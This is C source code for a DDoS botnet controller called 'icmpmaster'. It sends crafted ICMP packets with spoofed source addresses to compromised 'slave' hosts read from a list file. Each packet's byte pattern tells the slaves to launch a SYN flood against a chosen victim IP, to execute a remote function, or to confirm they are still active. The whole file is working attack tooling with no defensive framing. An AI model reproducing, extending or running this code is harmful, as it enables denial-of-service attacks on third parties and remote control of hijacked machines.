#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/time.h>
 #define __FAVOR_BSD
#include <netinet/tcp.h>


/* IMPORTANT VALUES */

    // DDoS synflood values
#define SYNFLOOD_PATTERN  'A'  /* fill datalen with this pattern to start DoS */
#define SYNFLOOD_DATALEN  128   /* this length with upper pattern will start DoS attack to ip->saddr */

    // let slave execute 'execute_fun'
#define EXEC_FUN_PATTERN  ' '  /* fill datalen with this pattern to execute 'exec_fun' function */
#define EXEC_FUN_DATALEN  64    /* this length with upper pattern will start executing */

    // is remote ip a slave?
#define SLAVE_REQUEST     'C'
#define SLAVE_REQLEN      32

/* ----- */

#define R_ICMPTYP    8      /* icmp type-> receive */
#define R_ICMPCODE   0      /* icmp code-> receive */

#define S_ICMPTYP    0      /* icmp type-> send reply */
#define S_ICMPCODE   0      /* icmp code-> send code */
#define RANDIP       (rand()%220)  /* give random ip */
#define SLAVEFILE    "slavelist.db" /* list with slave ips */


void err_q(int val, char *mess);
void header(void);
void help(void);
void check_slave(unsigned int daddr, unsigned int saddr);
int read_answer(int *sock, unsigned int addr);
int send_icmp(unsigned int saddr, unsigned int daddr, int code, int type, char typ, u_int nbytes);
char *return_randip(void);
unsigned int get_sourceip(void);
unsigned short in_cksum(unsigned short *ptr, int nbytes);

char fip[15];

int main(int argc, char **argv)
{
  FILE *fd;
  int i;
  short syn = 0, exec = 0, check = 0;
  char filename[]=SLAVEFILE;
  unsigned int saddr = 0, daddr = 0, rsaddr = 0;

  header();

  if(argc == 1) help();
  for(i = 0; i < argc; i++) {
    if(!strncmp(argv[i], "-f", 2)) saddr=inet_addr(argv[++i]);
    if(!strncmp(argv[i], "-d", 2)) daddr=inet_addr(argv[++i]);
    if(!strncmp(argv[i], "-slaves", 7)) strncpy(filename, argv[++i], sizeof(filename));
    if(!strncmp(argv[i], "-SYN", 4)) syn++;
    if(!strncmp(argv[i], "-EXEC", 5)) exec++;
    if(!strncmp(argv[i], "-CHECK", 6)) check++;
    if(!strncmp(argv[i], "-h", 2)) help();
  }
  
  if(!syn && !exec && !check) err_q(-1, "\t [!] you must specify an action\n");

  if(syn) printf("\t [#] performing syn attack\n");
  if(exec) printf("\t [#] performing activate slaves exec function\n");
  if(check) { 
      printf("\t [#] performing slave request\n");
      rsaddr = get_sourceip();
  }


  if(daddr) {         /* user took the -d flag to speak only to one slave */
      printf("\t [#] using no slave list- all action will take place on %s\n",inet_ntoa(daddr));
      if(exec) {
	  err_q(send_icmp(inet_addr(return_randip()), daddr, S_ICMPCODE, S_ICMPTYP,  EXEC_FUN_PATTERN, EXEC_FUN_DATALEN), "\t [!] cannot send icmp packet\n");
	  printf("\t [+] packet send to destination ip\n"); 
      }

      if(syn) { 
	  if(!saddr) err_q(-1, "\t [-] for synflooding you need to specify the source address with the -f flag. see -h for help\n");
	  err_q(send_icmp(saddr, daddr, S_ICMPCODE, S_ICMPTYP, SYNFLOOD_PATTERN, SYNFLOOD_DATALEN), "\t [!] cannot send icmp packet\n");
	  printf("\t [+] packet send to destination ip\n");
      }

      if(check) check_slave(daddr,rsaddr);
      return(0x00);
  }

  /* user didnt took the -d flag -> try to open the slave.db to look up slave ips */
 
  printf("\t [#] using slave list\n");
  fd = fopen(filename, "r");
  if(fd == NULL) {
    fprintf(stderr, "\t [!] cannot open slave database [%s]\n",filename);
    exit(0xff);
  }
  printf("\t [+] slave database successfully opend\n");
  while(1 > 0) {  
      if(fscanf(fd, "%s", fip) == EOF) break;       /* quit while when read EOF */
      if(exec) {
	  err_q(send_icmp(inet_addr(return_randip()),inet_addr(fip), S_ICMPCODE, S_ICMPTYP,  EXEC_FUN_PATTERN, EXEC_FUN_DATALEN), "\t [!] cannot send icmp packet\n");
	  printf("\t [+] packet send to destination ip [%s]\n",fip);
      }
      if(syn) { 
	  if(!saddr) err_q(-1, "\t [-] for synflooding you need to specify the source address with the -f flag. see -h for help\n");
	  err_q(send_icmp(saddr, inet_addr(fip), S_ICMPCODE, S_ICMPTYP, SYNFLOOD_PATTERN, SYNFLOOD_DATALEN), "\t [!] cannot send icmp packet\n");
	  printf("\t [+] packet send to destination ip\n");
      }
      if(check) check_slave(inet_addr(fip),rsaddr);
  }
  return(0x00);
}

void check_slave(unsigned int daddr, unsigned int rsaddr)
{
    int checksock;

    err_q(checksock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP), "\t [!] cannot creat socket\n");

    err_q(send_icmp(rsaddr, daddr, S_ICMPCODE, S_ICMPTYP, SLAVE_REQUEST, SLAVE_REQLEN), "\t [!] cannot send icmp packet\n");
    printf("\t [+] request send to destination ip\n");
    printf("\t [#] waiting for slave reqly...\n");
    if(read_answer(&checksock,daddr)) printf("\t [+] got a slave reqly from %s\n",inet_ntoa(daddr)); else
    printf("\t [-] didnt received a slave reply...\n");
}

unsigned int get_sourceip(void) {
  FILE *fd;
  char answer[5] = {'y'};
  char buf[20];

  fd = popen("/sbin/ifconfig | grep inet | grep -v 127 | awk '{print $2}' | cut -d \":\" -f 2", "r");     if(fd == NULL) goto jmp;    /* i knmow gotos suck... but seems to be the easiest way here */

  fscanf(fd, "%s",buf);
  printf("\t [*] your ip is %s\n",buf);
  printf("\t [?] corret?  y/n [y]: \n"); fflush(stdout);
  read(1, answer, sizeof(answer));
  if(answer[0] == 'y' || answer[0] == '\n' || answer[0] == 'Y') return(inet_addr(buf));
   
 jmp:
  printf("\t [?] enter your correct ip addres:"); fflush(stdout);
  read(1, buf, sizeof(buf));
  return(inet_addr(buf));  
} 

int send_icmp(unsigned int saddr, unsigned int daddr, int code, int type, char typ, u_int nbytes)
{
  int sockfd, test=1;
  char *packet, *buf;
  struct iphdr *ip;
  struct icmphdr *icmp;
  struct sockaddr_in server;

  ip = (struct iphdr *) malloc(sizeof(struct iphdr));
  icmp = (struct icmphdr *) malloc(sizeof(struct icmphdr));
  packet = (char *)malloc(sizeof(struct iphdr) + sizeof(struct icmphdr)+nbytes);
  if(packet == NULL) {
      fprintf(stderr, "\t [-] cannot allocate memory\n");
      return(-1);
  }
  
  buf = (char *)malloc(nbytes);          /* allocaote buffer */
  if(buf == NULL) {
      fprintf(stderr, "\t [-] cannot allocate memory\n");
      return(-1);
  }
  memset(packet, '\0',sizeof(packet));
  buf = packet+sizeof(struct iphdr)+sizeof(struct icmphdr);  
  memset(buf,typ ,nbytes);              /* fill with value */ 
 
  ip = (struct iphdr *)packet;
  icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

  ip->ihl = 5;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr)+nbytes;
  ip->id = htons(getuid());
  ip->ttl = 255;
  ip->protocol = IPPROTO_ICMP;
  ip->saddr = saddr;
  ip->daddr = daddr;

  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  if(sockfd < 0) {
    printf("\t [-] error cannot creat socket\n");
      return -1;
  }

  if( (setsockopt(sockfd, IPPROTO_IP,IP_HDRINCL,&test,sizeof(test))) < 0) {
    printf("\t [-] couldnt set IP_HDRINCL\n");
    return -1;
  }

  icmp->type = type;
  icmp->code = code;
  icmp->un.echo.id = 0;
  icmp->un.echo.sequence = 0;
  icmp->checksum = 0;
  icmp->checksum = in_cksum((unsigned short *)icmp,sizeof(struct icmphdr)+nbytes);
  ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

  server.sin_family = AF_INET;
  server.sin_port = htons(80); /* doesnt matter */
  server.sin_addr.s_addr = ip->daddr;

  if( (sendto(sockfd,packet,ip->tot_len,0,(struct sockaddr *)&server,
	      sizeof(struct sockaddr))) < ip->tot_len) {
    printf("\t [-] cannot send the packet\n");
    return -1;
  }
  return(ip->tot_len);
}

int read_answer(int *sock, unsigned int addr)
{
  char buff[40];
  struct iphdr *ip;
  struct icmphdr *icmp;
  fd_set rset;
  struct timeval tv;

  FD_ZERO(&rset);
  FD_SET(*sock, &rset);

  tv.tv_sec = 4; /* we wait 4 seconds for an answer */
  tv.tv_usec = 0;

  ip = (struct iphdr *)buff;
  icmp = (struct icmphdr *) (buff + sizeof(struct iphdr));
  while(select(*sock+1, &rset, NULL, NULL, &tv) > 0) {

    if(FD_ISSET(*sock, &rset)) {
     if(read(*sock, buff, sizeof(buff)) > 0) {
       if(ip->saddr == addr)
	 if(icmp->type == R_ICMPTYP && icmp->code == R_ICMPCODE) { 
	     close(*sock);
	     return 1;
	 }
	 else continue;
       else continue;
     }
   }
 }
  close(*sock);
  return 0;
}

void err_q(int val,char *mess)
{
  if(val < 0) {
    fprintf(stderr, mess);
    exit(0xff);
  }
}

void help(void)
{
  puts("\n\thelp");
  puts("\tthis program can be used to activate icmpslaves");
  puts("\tusage:");
  puts("\ticmpmaster [options] <SYN|EXEC|CHECK>");
  puts("\toptions:");
  puts("\t-d: dont open a slave database file - just use this ip as dest");
  puts("\t-f: the from argument. this argument must be specifed if you want");
  puts("\t    to syn flood some ip. the argument after -f must be the ip to");
  puts("\t    flood. so its a spoofed source ip address which will be flooded");
  puts("\t-slaves: next argument must be a alternative filename. ");
  puts("\t         on default the program will grap a file named SLAVEFILE");
  puts("\t-SYN: tell the programm to send a special crafted icmp packet to the");
  puts("\t      slave to activate the synflood action");
  puts("\t-EXEC: send a specail crafted icmp packet to the slave to start the");
  puts("\t       exec_fun function from the slave");
  puts("\t-CHECK: send slave request packet and wait for slave response.");
  puts("\t        to check if slave is active");
  puts("\t-h: print out help");
  exit(0x00);
}

void header(void)
{
  puts("\t###icmpmaster###");
  puts("\t    v 0.5");
  puts("\twww.excluded.org");
  puts("\t################\n\n");
}

char *return_randip(void)
{
    srand(time(0));
    snprintf(fip, 15, "%d.%d.%d.%d",RANDIP,RANDIP,RANDIP,RANDIP);
    return(fip);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
  register long	sum;
  u_short oddbyte;
  register u_short answer;

  sum = 0;
  while(nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

  if(nbytes == 1)
  {
    oddbyte = 0;
    *((u_char *) &oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }

  sum  = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;

  return(answer);
}

